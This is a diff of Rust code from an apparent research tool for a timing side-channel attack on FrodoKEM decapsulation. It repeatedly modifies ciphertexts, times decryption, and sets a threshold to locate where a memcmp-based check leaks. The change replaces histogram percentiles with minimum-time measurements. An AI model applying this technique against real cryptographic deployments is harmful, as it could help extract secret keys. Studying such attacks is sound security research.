@@ -1,11 +1,8 @@
 use crate::attack::memcmp_frodo::MeasureSource;
-use histogram::{Config as HConfig, Histogram};
 use liboqs_rs_bindings::frodokem::FrodoKem;
 use log::{debug, info, trace};
 use log_derive::{logfn, logfn_inputs};
 use std::convert::TryInto;
-
-const IGNORE_PP: f64 = 10.0;
 
 /// Function that dereministically modifies the input vector.
 ///
@@ -38,6 +35,7 @@ fn modify<FRODO: FrodoKem>(ct: &mut FRODO::Ciphertext, amount: usize) {
     }
 }
 
+#[logfn(Trace)]
 fn mod_measure<FRODO: FrodoKem>(
     amount: usize,
     iterations: usize,
@@ -45,21 +43,20 @@ fn mod_measure<FRODO: FrodoKem>(
     ct: &mut FRODO::Ciphertext,
     ss: &mut FRODO::SharedSecret,
     sk: &mut FRODO::SecretKey,
-    hconf: &HConfig,
-) -> Result<Histogram, String> {
-    let mut hist = hconf.build().ok_or(String::from(
-        "Cannot build historgram, to much memory required!",
-    ))?;
+) -> Result<u64, String> {
     modify::<FRODO>(ct, amount);
+    let mut lowest = u64::max_value();
     for _ in 0..iterations {
         let m = measure_source.measure(|| FRODO::decaps_measure(ct, ss, sk));
         if let Some(time) = m? {
-            hist.increment(time)?;
+            if time < lowest {
+                lowest = time;
+            }
         };
     }
     modify::<FRODO>(ct, amount);
 
-    Ok(hist)
+    Ok(lowest)
 }
 
 #[logfn_inputs(Trace)]
@@ -77,7 +74,6 @@ pub fn find_e<FRODO: FrodoKem>(
     let mut secret_key = FRODO::zero_sk();
     let mut ciphertext = FRODO::zero_ct();
     let ctlen = FRODO::as_slice(&mut ciphertext).len();
-    let hconf = Histogram::configure();
 
     info!("Generating keypair");
     FRODO::keypair(&mut public_key, &mut secret_key)?;
@@ -87,64 +83,37 @@ pub fn find_e<FRODO: FrodoKem>(
     let mut shared_secret_d = FRODO::zero_ss();
     FRODO::encaps(&mut ciphertext, &mut shared_secret_e, &mut public_key)?;
 
-    debug!(
-        "Starting with {} bits modification to end of ciphertext!",
-        start_mod
-    );
     info!("Running decryption oracle {} times for warmup.", warmup);
-    let _ = mod_measure::<FRODO>(
+    let warmuptime = mod_measure::<FRODO>(
         0,
         warmup,
         &measure_source,
         &mut ciphertext,
         &mut shared_secret_d,
         &mut secret_key,
-        &hconf,
     )?;
+    debug!("Warmup time {}", warmuptime);
 
-    info!("Running {} iterations with no cipertext modification to establish upper bound timing threshold.", iterations);
-    let ignoreabove = mod_measure::<FRODO>(
-        0,
-        iterations,
-        &measure_source,
-        &mut ciphertext,
-        &mut shared_secret_d,
-        &mut secret_key,
-        &hconf,
-    )?
-    .percentile(IGNORE_PP)?;
-    info!(
-        "Ignoring all measurments above {} which is the {}th percentile",
-        ignoreabove, IGNORE_PP
-    );
-    let hconf = hconf.max_value(ignoreabove).precision(8);
-
-    info!("Running {} iterations with a very minor cipertext modification at the end of C to establish upper bound timing threshold.", iterations);
-    let lowmodhist = mod_measure::<FRODO>(
+    info!("Running {} iterations with a low {} cipertext modification at the end of C to establish upper bound timing threshold.", iterations, start_mod);
+    let threshold_high = mod_measure::<FRODO>(
         start_mod,
         iterations,
         &measure_source,
         &mut ciphertext,
         &mut shared_secret_d,
         &mut secret_key,
-        &hconf,
     )?;
 
-    modify::<FRODO>(&mut ciphertext, ctlen);
-
     info!("Running {} iterations with a very major cipertext modification at the end of C to establish lower bound timing threshold.", iterations);
-    let highmodhist = mod_measure::<FRODO>(
+    let threshold_low = mod_measure::<FRODO>(
         ctlen,
         iterations,
         &measure_source,
         &mut ciphertext,
         &mut shared_secret_d,
         &mut secret_key,
-        &hconf,
     )?;
 
-    let threshold_high = lowmodhist.percentile(1.0)?;
-    let threshold_low = highmodhist.percentile(1.0)?;
     let threshold = (threshold_high + threshold_low) / 2;
     info!(
         "Using ({}+{})/2={} as threshold value, everything below will be used to detect changes to B as well.", threshold_high, threshold_low,
@@ -162,16 +131,15 @@ pub fn find_e<FRODO: FrodoKem>(
             "Testing {} bitflips with {} iterations",
             currentmod, iterations
         );
-        let modhist = mod_measure::<FRODO>(
+        let time = mod_measure::<FRODO>(
             currentmod,
             iterations,
             &measure_source,
             &mut ciphertext,
             &mut shared_secret_d,
             &mut secret_key,
-            &hconf,
         )?;
-        let time = modhist.percentile(1.0)?;
+
         debug!("time measurment is {}", time);
         if time >= threshold {
             info!("Raising lowerbound to {}", currentmod);
